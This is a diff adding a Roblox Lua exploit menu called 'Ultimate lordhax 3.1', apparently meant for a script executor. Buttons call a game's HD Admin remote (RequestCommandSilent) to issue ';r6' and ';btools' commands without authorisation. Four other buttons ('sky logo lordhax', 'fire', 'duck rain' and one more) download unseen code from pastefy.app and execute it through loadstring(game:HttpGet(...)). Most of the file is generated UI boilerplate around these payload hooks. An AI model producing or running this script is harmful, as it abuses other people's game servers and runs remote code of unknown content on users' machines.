@@ -1,0 +1,5772 @@
+--[=[
+ ██╗  ██╗ ██████╗  █████╗ ███╗   ██╗ ██████╗ ████████╗████████╗         ████████╗      ██████╗
+██║  ██║██╔═══██╗██╔══██╗████╗  ██║██╔════╝ ╚══██╔══╝╚══██╔══╝        ██╔═══██╗     ██╔═══██╗
+███████║██║   ██║███████║██╔██╗ ██║██║  ███╗   ██║      ██║              ██║   ██║            ██║
+██╔══██║██║   ██║██╔══██║██║╚██╗██║██║   ██║   ██║      ██║              ██║   ██║      ██████╔╝
+██║  ██║╚██████╔╝██║  ██║██║ ╚████║╚██████╔╝   ██║      ██║      ██      ██║   ██║     ╚════██╗
+╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝    ╚═╝      ╚═╝      ╚═╝     ╚███████╝     ██████╔╝
+using gui creator by hoangtt03                                                               
+]=]
+local RunService = game:GetService("RunService")
+local UserInputService = game:GetService("UserInputService")
+local HTT03 = {}
+local _rbFuncs = {}
+-- ScreenGui "ScreenGui_1"
+HTT03["ScreenGui_1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"))
+HTT03["ScreenGui_1"].Name = "ScreenGui_1"
+HTT03["ScreenGui_1"].Enabled = true
+HTT03["ScreenGui_1"].DisplayOrder = 0
+HTT03["ScreenGui_1"].IgnoreGuiInset = true
+HTT03["ScreenGui_1"].ResetOnSpawn = false
+-- TextButton "TextButton"
+HTT03["TextButton_2"] = Instance.new("TextButton", HTT03["ScreenGui_1"])
+HTT03["TextButton_2"].Name = "TextButton"
+HTT03["TextButton_2"].Visible = true
+HTT03["TextButton_2"].ZIndex = 1
+HTT03["TextButton_2"].LayoutOrder = 0
+HTT03["TextButton_2"].Position = UDim2.new(0.000000,4,0.000000,333)
+HTT03["TextButton_2"].Size = UDim2.new(0.000000,120,0.000000,37)
+HTT03["TextButton_2"].AnchorPoint = Vector2.new(0.000000,0.000000)
+HTT03["TextButton_2"].Rotation = 0
+HTT03["TextButton_2"].BackgroundColor3 = Color3.fromRGB(0,0,0)
+HTT03["TextButton_2"].BackgroundTransparency = 0
+HTT03["TextButton_2"].BorderSizePixel = 4
+HTT03["TextButton_2"].BorderColor3 = Color3.fromRGB(0,8,255)
+HTT03["TextButton_2"].ClipsDescendants = false
+HTT03["TextButton_2"].Active = true
+HTT03["TextButton_2"].Selectable = true
+HTT03["TextButton_2"].AutoButtonColor = true
+HTT03["TextButton_2"].Modal = false
+HTT03["TextButton_2"].Text = "open gui"
+HTT03["TextButton_2"].TextColor3 = Color3.fromRGB(255,255,255)
+HTT03["TextButton_2"].TextSize = 12
+HTT03["TextButton_2"].TextTransparency = 0
+HTT03["TextButton_2"].TextScaled = false
+HTT03["TextButton_2"].TextWrapped = false
+HTT03["TextButton_2"].TextXAlignment = Enum.TextXAlignment.Center
+HTT03["TextButton_2"].TextYAlignment = Enum.TextYAlignment.Center
+HTT03["TextButton_2"].Font = Enum.Font.Legacy
+HTT03["TextButton_2"].TextStrokeColor3 = Color3.fromRGB(0,0,0)
+HTT03["TextButton_2"].TextStrokeTransparency = 1
+HTT03["TextButton_2"].RichText = false
+-- Auto constraint "TextButton"
+HTT03["UIAspectRatioConstraint_3"] = Instance.new("UIAspectRatioConstraint", HTT03["TextButton_2"])
+HTT03["UIAspectRatioConstraint_3"].AspectRatio = 3.243243
+-- UIGradient "UIGradientRainbow"
+HTT03["UIGradient_4"] = Instance.new("UIGradient", HTT03["TextButton_2"])
+HTT03["UIGradient_4"].Name = "UIGradientRainbow"
+HTT03["UIGradient_4"].Enabled = true
+HTT03["UIGradient_4"].Rotation = 45
+HTT03["UIGradient_4"].Offset = Vector2.new(0.000000,0.000000)
+HTT03["UIGradient_4"].Color = ColorSequence.new(Color3.fromRGB(0,146,255), Color3.fromRGB(0,146,255))
+do
+    local _f = HTT03["UIGradient_4"]
+    local _g = _f:IsA("UIGradient") and _f or _f:FindFirstChildOfClass("UIGradient")
+    if _g then
+        local _o = 0
+        table.insert(_rbFuncs, function(dt)
+            if not _g or not _g.Parent then return end
+            _o = (_o + dt * 0.3) % 1
+            local k = {}
+            for i = 0, 7 do local t = i / 7; table.insert(k, ColorSequenceKeypoint.new(t, Color3.fromHSV((t + _o) % 1, 1, 1))) end
+            _g.Color = ColorSequence.new(k)
+        end)
+    end
+end
+-- Frame "Frame"
+HTT03["Frame_5"] = Instance.new("Frame", HTT03["ScreenGui_1"])
+HTT03["Frame_5"].Name = "Frame"
+HTT03["Frame_5"].Visible = false
+HTT03["Frame_5"].ZIndex = 1
+HTT03["Frame_5"].LayoutOrder = 0
+HTT03["Frame_5"].Position = UDim2.new(0.000000,188,0.000000,45)
+HTT03["Frame_5"].Size = UDim2.new(0.000000,524,0.000000,451)
+HTT03["Frame_5"].AnchorPoint = Vector2.new(0.000000,0.000000)
+HTT03["Frame_5"].Rotation = 0
+HTT03["Frame_5"].BackgroundColor3 = Color3.fromRGB(0,0,0)
+HTT03["Frame_5"].BackgroundTransparency = 0
+HTT03["Frame_5"].BorderSizePixel = 4
+HTT03["Frame_5"].BorderColor3 = Color3.fromRGB(0,23,255)
+HTT03["Frame_5"].ClipsDescendants = false
+HTT03["Frame_5"].Active = false
+HTT03["Frame_5"].Selectable = false
+do
+    local _f = HTT03["Frame_5"]
+    local _d, _ds, _sp = false, nil, nil
+    _f.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then _d = true; _ds = input.Position; _sp = _f.Position end
+    end)
+    UserInputService.InputChanged:Connect(function(input)
+        if _d and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+            if not _f.Parent then _d = false; return end
+            local delta = input.Position - _ds
+            _f.Position = UDim2.new(_sp.X.Scale, _sp.X.Offset + delta.X, _sp.Y.Scale, _sp.Y.Offset + delta.Y)
+        end
+    end)
+    UserInputService.InputEnded:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then _d = false end
+    end)
+end
+-- Auto constraint "Frame"
+HTT03["UIAspectRatioConstraint_6"] = Instance.new("UIAspectRatioConstraint", HTT03["Frame_5"])
+HTT03["UIAspectRatioConstraint_6"].AspectRatio = 1.161863
+-- TextLabel "TextLabel"
+HTT03["TextLabel_7"] = Instance.new("TextLabel", HTT03["Frame_5"])
+HTT03["TextLabel_7"].Name = "TextLabel"
+HTT03["TextLabel_7"].Visible = true
+HTT03["TextLabel_7"].ZIndex = 1
+HTT03["TextLabel_7"].LayoutOrder = 0
+HTT03["TextLabel_7"].Position = UDim2.new(0.000000,111,0.000000,2)
+HTT03["TextLabel_7"].Size = UDim2.new(0.000000,266,0.000000,60)
+HTT03["TextLabel_7"].AnchorPoint = Vector2.new(0.000000,0.000000)
+HTT03["TextLabel_7"].Rotation = 0
+HTT03["TextLabel_7"].BackgroundColor3 = Color3.fromRGB(0,0,0)
+HTT03["TextLabel_7"].BackgroundTransparency = 0
+HTT03["TextLabel_7"].BorderSizePixel = 1
+HTT03["TextLabel_7"].BorderColor3 = Color3.fromRGB(0,0,0)
+HTT03["TextLabel_7"].ClipsDescendants = false
+HTT03["TextLabel_7"].Active = false
+HTT03["TextLabel_7"].Selectable = false
+HTT03["TextLabel_7"].Text = "Ultimate lordhax 3.1"
+HTT03["TextLabel_7"].TextColor3 = Color3.fromRGB(255,255,255)
+HTT03["TextLabel_7"].TextSize = 15
+HTT03["TextLabel_7"].TextTransparency = 0
+HTT03["TextLabel_7"].TextScaled = false
+HTT03["TextLabel_7"].TextWrapped = false
+HTT03["TextLabel_7"].TextXAlignment = Enum.TextXAlignment.Center
+HTT03["TextLabel_7"].TextYAlignment = Enum.TextYAlignment.Center
+HTT03["TextLabel_7"].Font = Enum.Font.Legacy
+HTT03["TextLabel_7"].TextStrokeColor3 = Color3.fromRGB(0,0,0)
+HTT03["TextLabel_7"].TextStrokeTransparency = 1
+HTT03["TextLabel_7"].RichText = false
+-- Auto constraint "TextLabel"
+HTT03["UIAspectRatioConstraint_8"] = Instance.new("UIAspectRatioConstraint", HTT03["TextLabel_7"])
+HTT03["UIAspectRatioConstraint_8"].AspectRatio = 4.433333
+-- TextButton "TextButton"
+HTT03["TextButton_9"] = Instance.new("TextButton", HTT03["Frame_5"])
+HTT03["TextButton_9"].Name = "TextButton"
+HTT03["TextButton_9"].Visible = true
+HTT03["TextButton_9"].ZIndex = 1
+HTT03["TextButton_9"].LayoutOrder = 0
+HTT03["TextButton_9"].Position = UDim2.new(0.000000,-66,0.000000,18)
+HTT03["TextButton_9"].Size = UDim2.new(0.000000,61,0.000000,52)
+HTT03["TextButton_9"].AnchorPoint = Vector2.new(0.000000,0.000000)
+HTT03["TextButton_9"].Rotation = 0
+HTT03["TextButton_9"].BackgroundColor3 = Color3.fromRGB(0,0,0)
+HTT03["TextButton_9"].BackgroundTransparency = 0
+HTT03["TextButton_9"].BorderSizePixel = 3
+HTT03["TextButton_9"].BorderColor3 = Color3.fromRGB(0,29,255)
+HTT03["TextButton_9"].ClipsDescendants = false
+HTT03["TextButton_9"].Active = true
+HTT03["TextButton_9"].Selectable = true
+HTT03["TextButton_9"].AutoButtonColor = true
+HTT03["TextButton_9"].Modal = false
+HTT03["TextButton_9"].Text = "r6"
+HTT03["TextButton_9"].TextColor3 = Color3.fromRGB(255,255,255)
+HTT03["TextButton_9"].TextSize = 10
+HTT03["TextButton_9"].TextTransparency = 0
+HTT03["TextButton_9"].TextScaled = false
+HTT03["TextButton_9"].TextWrapped = false
+HTT03["TextButton_9"].TextXAlignment = Enum.TextXAlignment.Center
+HTT03["TextButton_9"].TextYAlignment = Enum.TextYAlignment.Center
+HTT03["TextButton_9"].Font = Enum.Font.Legacy
+HTT03["TextButton_9"].TextStrokeColor3 = Color3.fromRGB(0,0,0)
+HTT03["TextButton_9"].TextStrokeTransparency = 1
+HTT03["TextButton_9"].RichText = false
+-- Auto constraint "TextButton"
+HTT03["UIAspectRatioConstraint_10"] = Instance.new("UIAspectRatioConstraint", HTT03["TextButton_9"])
+HTT03["UIAspectRatioConstraint_10"].AspectRatio = 1.173077
+-- LocalScript "LocalScript"
+HTT03["LocalScript_11"] = Instance.new("LocalScript")
+HTT03["LocalScript_11"].Name = "LocalScript"
+do
+    pcall(function()
+        if setthreadidentity then setthreadidentity(8) end
+        HTT03["LocalScript_11"].Source = [==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+	local ReplicatedStorage = game:GetService("ReplicatedStorage")
+	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+
+	RequestCommand:InvokeServer(";r6")
+end)]==]
+    end)
+    HTT03["LocalScript_11"].Parent = HTT03["TextButton_9"]
+    if HTT03["LocalScript_11"]:IsA("BaseScript") then HTT03["LocalScript_11"].Enabled = true end
+    pcall(function()
+        local _gcFn = loadstring and loadstring([==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+	local ReplicatedStorage = game:GetService("ReplicatedStorage")
+	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+
+	RequestCommand:InvokeServer(";r6")
+end)]==]) or load([==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+	local ReplicatedStorage = game:GetService("ReplicatedStorage")
+	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+
+	RequestCommand:InvokeServer(";r6")
+end)]==])
+        if _gcFn then
+            local _gcEnv = setmetatable({script = HTT03["LocalScript_11"]}
+                , {__index = getfenv and getfenv() or _G})
+            pcall(function() setfenv(_gcFn, _gcEnv) end)
+            pcall(_gcFn)
+        end
+    end)
+end
+-- TextButton "TextButton"
+HTT03["TextButton_12"] = Instance.new("TextButton", HTT03["Frame_5"])
+HTT03["TextButton_12"].Name = "TextButton"
+HTT03["TextButton_12"].Visible = true
+HTT03["TextButton_12"].ZIndex = 1
+HTT03["TextButton_12"].LayoutOrder = 0
+HTT03["TextButton_12"].Position = UDim2.new(0.000000,-66,0.000000,71)
+HTT03["TextButton_12"].Size = UDim2.new(0.000000,61,0.000000,47)
+HTT03["TextButton_12"].AnchorPoint = Vector2.new(0.000000,0.000000)
+HTT03["TextButton_12"].Rotation = 0
+HTT03["TextButton_12"].BackgroundColor3 = Color3.fromRGB(0,0,0)
+HTT03["TextButton_12"].BackgroundTransparency = 0
+HTT03["TextButton_12"].BorderSizePixel = 3
+HTT03["TextButton_12"].BorderColor3 = Color3.fromRGB(0,0,255)
+HTT03["TextButton_12"].ClipsDescendants = false
+HTT03["TextButton_12"].Active = true
+HTT03["TextButton_12"].Selectable = true
+HTT03["TextButton_12"].AutoButtonColor = true
+HTT03["TextButton_12"].Modal = false
+HTT03["TextButton_12"].Text = "f3x"
+HTT03["TextButton_12"].TextColor3 = Color3.fromRGB(255,255,255)
+HTT03["TextButton_12"].TextSize = 10
+HTT03["TextButton_12"].TextTransparency = 0
+HTT03["TextButton_12"].TextScaled = false
+HTT03["TextButton_12"].TextWrapped = false
+HTT03["TextButton_12"].TextXAlignment = Enum.TextXAlignment.Center
+HTT03["TextButton_12"].TextYAlignment = Enum.TextYAlignment.Center
+HTT03["TextButton_12"].Font = Enum.Font.Legacy
+HTT03["TextButton_12"].TextStrokeColor3 = Color3.fromRGB(0,0,0)
+HTT03["TextButton_12"].TextStrokeTransparency = 1
+HTT03["TextButton_12"].RichText = false
+-- Auto constraint "TextButton"
+HTT03["UIAspectRatioConstraint_13"] = Instance.new("UIAspectRatioConstraint", HTT03["TextButton_12"])
+HTT03["UIAspectRatioConstraint_13"].AspectRatio = 1.297872
+-- LocalScript "LocalScript"
+HTT03["LocalScript_14"] = Instance.new("LocalScript")
+HTT03["LocalScript_14"].Name = "LocalScript"
+do
+    pcall(function()
+        if setthreadidentity then setthreadidentity(8) end
+        HTT03["LocalScript_14"].Source = [==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+	local ReplicatedStorage = game:GetService("ReplicatedStorage")
+	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+
+	RequestCommand:InvokeServer(";btools")
+end)]==]
+    end)
+    HTT03["LocalScript_14"].Parent = HTT03["TextButton_12"]
+    if HTT03["LocalScript_14"]:IsA("BaseScript") then HTT03["LocalScript_14"].Enabled = true end
+    pcall(function()
+        local _gcFn = loadstring and loadstring([==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+	local ReplicatedStorage = game:GetService("ReplicatedStorage")
+	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+
+	RequestCommand:InvokeServer(";btools")
+end)]==]) or load([==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+	local ReplicatedStorage = game:GetService("ReplicatedStorage")
+	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+
+	RequestCommand:InvokeServer(";btools")
+end)]==])
+        if _gcFn then
+            local _gcEnv = setmetatable({script = HTT03["LocalScript_14"]}
+                , {__index = getfenv and getfenv() or _G})
+            pcall(function() setfenv(_gcFn, _gcEnv) end)
+            pcall(_gcFn)
+        end
+    end)
+end
+-- ScrollingFrame "ScrollingFrame"
+HTT03["ScrollingFrame_15"] = Instance.new("ScrollingFrame", HTT03["Frame_5"])
+HTT03["ScrollingFrame_15"].Name = "ScrollingFrame"
+HTT03["ScrollingFrame_15"].Visible = true
+HTT03["ScrollingFrame_15"].ZIndex = 1
+HTT03["ScrollingFrame_15"].LayoutOrder = 0
+HTT03["ScrollingFrame_15"].Position = UDim2.new(0.000000,2,0.000000,54)
+HTT03["ScrollingFrame_15"].Size = UDim2.new(0.000000,520,0.000000,396)
+HTT03["ScrollingFrame_15"].AnchorPoint = Vector2.new(0.000000,0.000000)
+HTT03["ScrollingFrame_15"].Rotation = 0
+HTT03["ScrollingFrame_15"].BackgroundColor3 = Color3.fromRGB(0,0,0)
+HTT03["ScrollingFrame_15"].BackgroundTransparency = 0
+HTT03["ScrollingFrame_15"].BorderSizePixel = 2
+HTT03["ScrollingFrame_15"].BorderColor3 = Color3.fromRGB(53,0,255)
+HTT03["ScrollingFrame_15"].ClipsDescendants = true
+HTT03["ScrollingFrame_15"].Active = false
+HTT03["ScrollingFrame_15"].Selectable = true
+HTT03["ScrollingFrame_15"].ScrollBarThickness = 19
+HTT03["ScrollingFrame_15"].ScrollBarImageColor3 = Color3.fromRGB(255,255,255)
+HTT03["ScrollingFrame_15"].ScrollBarImageTransparency = 0
+HTT03["ScrollingFrame_15"].ScrollingDirection = Enum.ScrollingDirection.XY
+HTT03["ScrollingFrame_15"].AutomaticCanvasSize = Enum.AutomaticSize.None
+HTT03["ScrollingFrame_15"].CanvasSize = UDim2.new(0.000000,0,2.000000,0)
+HTT03["ScrollingFrame_15"].ElasticBehavior = Enum.ElasticBehavior.WhenScrollable
+-- Auto constraint "ScrollingFrame"
+HTT03["UIAspectRatioConstraint_16"] = Instance.new("UIAspectRatioConstraint", HTT03["ScrollingFrame_15"])
+HTT03["UIAspectRatioConstraint_16"].AspectRatio = 1.313131
+-- TextButton "TextButton"
+HTT03["TextButton_17"] = Instance.new("TextButton", HTT03["ScrollingFrame_15"])
+HTT03["TextButton_17"].Name = "TextButton"
+HTT03["TextButton_17"].Visible = true
+HTT03["TextButton_17"].ZIndex = 1
+HTT03["TextButton_17"].LayoutOrder = 0
+HTT03["TextButton_17"].Position = UDim2.new(0.000000,18,0.000000,20)
+HTT03["TextButton_17"].Size = UDim2.new(0.000000,122,0.000000,44)
+HTT03["TextButton_17"].AnchorPoint = Vector2.new(0.000000,0.000000)
+HTT03["TextButton_17"].Rotation = 0
+HTT03["TextButton_17"].BackgroundColor3 = Color3.fromRGB(0,0,0)
+HTT03["TextButton_17"].BackgroundTransparency = 0
+HTT03["TextButton_17"].BorderSizePixel = 3
+HTT03["TextButton_17"].BorderColor3 = Color3.fromRGB(5,0,255)
+HTT03["TextButton_17"].ClipsDescendants = false
+HTT03["TextButton_17"].Active = true
+HTT03["TextButton_17"].Selectable = true
+HTT03["TextButton_17"].AutoButtonColor = true
+HTT03["TextButton_17"].Modal = false
+HTT03["TextButton_17"].Text = "sky logo lordhax"
+HTT03["TextButton_17"].TextColor3 = Color3.fromRGB(255,255,255)
+HTT03["TextButton_17"].TextSize = 10
+HTT03["TextButton_17"].TextTransparency = 0
+HTT03["TextButton_17"].TextScaled = false
+HTT03["TextButton_17"].TextWrapped = false
+HTT03["TextButton_17"].TextXAlignment = Enum.TextXAlignment.Center
+HTT03["TextButton_17"].TextYAlignment = Enum.TextYAlignment.Center
+HTT03["TextButton_17"].Font = Enum.Font.Legacy
+HTT03["TextButton_17"].TextStrokeColor3 = Color3.fromRGB(0,0,0)
+HTT03["TextButton_17"].TextStrokeTransparency = 1
+HTT03["TextButton_17"].RichText = false
+-- Auto constraint "TextButton"
+HTT03["UIAspectRatioConstraint_18"] = Instance.new("UIAspectRatioConstraint", HTT03["TextButton_17"])
+HTT03["UIAspectRatioConstraint_18"].AspectRatio = 2.772727
+-- LocalScript "LocalScript"
+HTT03["LocalScript_19"] = Instance.new("LocalScript")
+HTT03["LocalScript_19"].Name = "LocalScript"
+do
+    pcall(function()
+        if setthreadidentity then setthreadidentity(8) end
+        HTT03["LocalScript_19"].Source = [==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastefy.app/kadx99MO/raw"))()
+end)]==]
+    end)
+    HTT03["LocalScript_19"].Parent = HTT03["TextButton_17"]
+    if HTT03["LocalScript_19"]:IsA("BaseScript") then HTT03["LocalScript_19"].Enabled = true end
+    pcall(function()
+        local _gcFn = loadstring and loadstring([==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastefy.app/kadx99MO/raw"))()
+end)]==]) or load([==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastefy.app/kadx99MO/raw"))()
+end)]==])
+        if _gcFn then
+            local _gcEnv = setmetatable({script = HTT03["LocalScript_19"]}
+                , {__index = getfenv and getfenv() or _G})
+            pcall(function() setfenv(_gcFn, _gcEnv) end)
+            pcall(_gcFn)
+        end
+    end)
+end
+-- TextButton "TextButton"
+HTT03["TextButton_20"] = Instance.new("TextButton", HTT03["ScrollingFrame_15"])
+HTT03["TextButton_20"].Name = "TextButton"
+HTT03["TextButton_20"].Visible = true
+HTT03["TextButton_20"].ZIndex = 1
+HTT03["TextButton_20"].LayoutOrder = 0
+HTT03["TextButton_20"].Position = UDim2.new(0.000000,190,0.000000,20)
+HTT03["TextButton_20"].Size = UDim2.new(0.000000,122,0.000000,44)
+HTT03["TextButton_20"].AnchorPoint = Vector2.new(0.000000,0.000000)
+HTT03["TextButton_20"].Rotation = 0
+HTT03["TextButton_20"].BackgroundColor3 = Color3.fromRGB(0,0,0)
+HTT03["TextButton_20"].BackgroundTransparency = 0
+HTT03["TextButton_20"].BorderSizePixel = 3
+HTT03["TextButton_20"].BorderColor3 = Color3.fromRGB(29,0,255)
+HTT03["TextButton_20"].ClipsDescendants = false
+HTT03["TextButton_20"].Active = true
+HTT03["TextButton_20"].Selectable = true
+HTT03["TextButton_20"].AutoButtonColor = true
+HTT03["TextButton_20"].Modal = false
+HTT03["TextButton_20"].Text = "deacl logo lordhax"
+HTT03["TextButton_20"].TextColor3 = Color3.fromRGB(255,255,255)
+HTT03["TextButton_20"].TextSize = 10
+HTT03["TextButton_20"].TextTransparency = 0
+HTT03["TextButton_20"].TextScaled = false
+HTT03["TextButton_20"].TextWrapped = false
+HTT03["TextButton_20"].TextXAlignment = Enum.TextXAlignment.Center
+HTT03["TextButton_20"].TextYAlignment = Enum.TextYAlignment.Center
+HTT03["TextButton_20"].Font = Enum.Font.Legacy
+HTT03["TextButton_20"].TextStrokeColor3 = Color3.fromRGB(0,0,0)
+HTT03["TextButton_20"].TextStrokeTransparency = 1
+HTT03["TextButton_20"].RichText = false
+-- Auto constraint "TextButton"
+HTT03["UIAspectRatioConstraint_21"] = Instance.new("UIAspectRatioConstraint", HTT03["TextButton_20"])
+HTT03["UIAspectRatioConstraint_21"].AspectRatio = 2.772727
+-- LocalScript "LocalScript"
+HTT03["LocalScript_22"] = Instance.new("LocalScript")
+HTT03["LocalScript_22"].Name = "LocalScript"
+do
+    pcall(function()
+        if setthreadidentity then setthreadidentity(8) end
+        HTT03["LocalScript_22"].Source = [==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastefy.app/R1LiaQ88/raw"))()
+end)]==]
+    end)
+    HTT03["LocalScript_22"].Parent = HTT03["TextButton_20"]
+    if HTT03["LocalScript_22"]:IsA("BaseScript") then HTT03["LocalScript_22"].Enabled = true end
+    pcall(function()
+        local _gcFn = loadstring and loadstring([==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastefy.app/R1LiaQ88/raw"))()
+end)]==]) or load([==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastefy.app/R1LiaQ88/raw"))()
+end)]==])
+        if _gcFn then
+            local _gcEnv = setmetatable({script = HTT03["LocalScript_22"]}
+                , {__index = getfenv and getfenv() or _G})
+            pcall(function() setfenv(_gcFn, _gcEnv) end)
+            pcall(_gcFn)
+        end
+    end)
+end
+-- TextButton "TextButton"
+HTT03["TextButton_23"] = Instance.new("TextButton", HTT03["ScrollingFrame_15"])
+HTT03["TextButton_23"].Name = "TextButton"
+HTT03["TextButton_23"].Visible = true
+HTT03["TextButton_23"].ZIndex = 1
+HTT03["TextButton_23"].LayoutOrder = 0
+HTT03["TextButton_23"].Position = UDim2.new(0.000000,363,0.000000,19)
+HTT03["TextButton_23"].Size = UDim2.new(0.000000,120,0.000000,42)
+HTT03["TextButton_23"].AnchorPoint = Vector2.new(0.000000,0.000000)
+HTT03["TextButton_23"].Rotation = 0
+HTT03["TextButton_23"].BackgroundColor3 = Color3.fromRGB(0,0,0)
+HTT03["TextButton_23"].BackgroundTransparency = 0
+HTT03["TextButton_23"].BorderSizePixel = 3
+HTT03["TextButton_23"].BorderColor3 = Color3.fromRGB(11,0,255)
+HTT03["TextButton_23"].ClipsDescendants = false
+HTT03["TextButton_23"].Active = true
+HTT03["TextButton_23"].Selectable = true
+HTT03["TextButton_23"].AutoButtonColor = true
+HTT03["TextButton_23"].Modal = false
+HTT03["TextButton_23"].Text = "fire"
+HTT03["TextButton_23"].TextColor3 = Color3.fromRGB(255,255,255)
+HTT03["TextButton_23"].TextSize = 10
+HTT03["TextButton_23"].TextTransparency = 0
+HTT03["TextButton_23"].TextScaled = false
+HTT03["TextButton_23"].TextWrapped = false
+HTT03["TextButton_23"].TextXAlignment = Enum.TextXAlignment.Center
+HTT03["TextButton_23"].TextYAlignment = Enum.TextYAlignment.Center
+HTT03["TextButton_23"].Font = Enum.Font.Legacy
+HTT03["TextButton_23"].TextStrokeColor3 = Color3.fromRGB(0,0,0)
+HTT03["TextButton_23"].TextStrokeTransparency = 1
+HTT03["TextButton_23"].RichText = false
+-- Auto constraint "TextButton"
+HTT03["UIAspectRatioConstraint_24"] = Instance.new("UIAspectRatioConstraint", HTT03["TextButton_23"])
+HTT03["UIAspectRatioConstraint_24"].AspectRatio = 2.857143
+-- LocalScript "LocalScript"
+HTT03["LocalScript_25"] = Instance.new("LocalScript")
+HTT03["LocalScript_25"].Name = "LocalScript"
+do
+    pcall(function()
+        if setthreadidentity then setthreadidentity(8) end
+        HTT03["LocalScript_25"].Source = [==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastefy.app/2Krqo25v/raw"))()
+end)]==]
+    end)
+    HTT03["LocalScript_25"].Parent = HTT03["TextButton_23"]
+    if HTT03["LocalScript_25"]:IsA("BaseScript") then HTT03["LocalScript_25"].Enabled = true end
+    pcall(function()
+        local _gcFn = loadstring and loadstring([==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastefy.app/2Krqo25v/raw"))()
+end)]==]) or load([==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastefy.app/2Krqo25v/raw"))()
+end)]==])
+        if _gcFn then
+            local _gcEnv = setmetatable({script = HTT03["LocalScript_25"]}
+                , {__index = getfenv and getfenv() or _G})
+            pcall(function() setfenv(_gcFn, _gcEnv) end)
+            pcall(_gcFn)
+        end
+    end)
+end
+-- TextButton "TextButton"
+HTT03["TextButton_26"] = Instance.new("TextButton", HTT03["ScrollingFrame_15"])
+HTT03["TextButton_26"].Name = "TextButton"
+HTT03["TextButton_26"].Visible = true
+HTT03["TextButton_26"].ZIndex = 1
+HTT03["TextButton_26"].LayoutOrder = 0
+HTT03["TextButton_26"].Position = UDim2.new(0.000000,18,0.000000,105)
+HTT03["TextButton_26"].Size = UDim2.new(0.000000,122,0.000000,44)
+HTT03["TextButton_26"].AnchorPoint = Vector2.new(0.000000,0.000000)
+HTT03["TextButton_26"].Rotation = 0
+HTT03["TextButton_26"].BackgroundColor3 = Color3.fromRGB(0,0,0)
+HTT03["TextButton_26"].BackgroundTransparency = 0
+HTT03["TextButton_26"].BorderSizePixel = 3
+HTT03["TextButton_26"].BorderColor3 = Color3.fromRGB(0,11,255)
+HTT03["TextButton_26"].ClipsDescendants = false
+HTT03["TextButton_26"].Active = true
+HTT03["TextButton_26"].Selectable = true
+HTT03["TextButton_26"].AutoButtonColor = true
+HTT03["TextButton_26"].Modal = false
+HTT03["TextButton_26"].Text = "duck rain"
+HTT03["TextButton_26"].TextColor3 = Color3.fromRGB(255,255,255)
+HTT03["TextButton_26"].TextSize = 10
+HTT03["TextButton_26"].TextTransparency = 0
+HTT03["TextButton_26"].TextScaled = false
+HTT03["TextButton_26"].TextWrapped = false
+HTT03["TextButton_26"].TextXAlignment = Enum.TextXAlignment.Center
+HTT03["TextButton_26"].TextYAlignment = Enum.TextYAlignment.Center
+HTT03["TextButton_26"].Font = Enum.Font.Legacy
+HTT03["TextButton_26"].TextStrokeColor3 = Color3.fromRGB(0,0,0)
+HTT03["TextButton_26"].TextStrokeTransparency = 1
+HTT03["TextButton_26"].RichText = false
+-- Auto constraint "TextButton"
+HTT03["UIAspectRatioConstraint_27"] = Instance.new("UIAspectRatioConstraint", HTT03["TextButton_26"])
+HTT03["UIAspectRatioConstraint_27"].AspectRatio = 2.772727
+-- LocalScript "LocalScript"
+HTT03["LocalScript_28"] = Instance.new("LocalScript")
+HTT03["LocalScript_28"].Name = "LocalScript"
+do
+    pcall(function()
+        if setthreadidentity then setthreadidentity(8) end
+        HTT03["LocalScript_28"].Source = [==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastefy.app/XmSanS72/raw"))()
+end)]==]
+    end)
+    HTT03["LocalScript_28"].Parent = HTT03["TextButton_26"]
+    if HTT03["LocalScript_28"]:IsA("BaseScript") then HTT03["LocalScript_28"].Enabled = true end
+    pcall(function()
+        local _gcFn = loadstring and loadstring([==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastefy.app/XmSanS72/raw"))()
+end)]==]) or load([==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastefy.app/XmSanS72/raw"))()
+end)]==])
+        if _gcFn then
+            local _gcEnv = setmetatable({script = HTT03["LocalScript_28"]}
+                , {__index = getfenv and getfenv() or _G})
+            pcall(function() setfenv(_gcFn, _gcEnv) end)
+            pcall(_gcFn)
+        end
+    end)
+end
